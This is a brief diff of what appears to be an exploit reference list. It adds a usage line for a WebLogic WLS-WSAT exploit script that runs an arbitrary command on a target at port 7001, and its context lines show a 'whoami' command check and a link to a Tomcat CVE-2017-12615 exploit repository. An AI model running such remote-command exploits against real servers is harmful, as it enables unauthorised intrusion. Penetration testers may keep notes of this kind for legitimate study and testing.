@@ -32,6 +32,8 @@ cmd >> whoami (直接回顯在terminal)
 12.1.3.0.0
 12.2.1.1.0
 12.2.1.2.0
+use :
+python2 weblogic_wls_wsat_exp.py -t 192.168.235.128:7001 -c "command"
 
 # Tomcat
 https://github.com/1337g/CVE-2017-12615
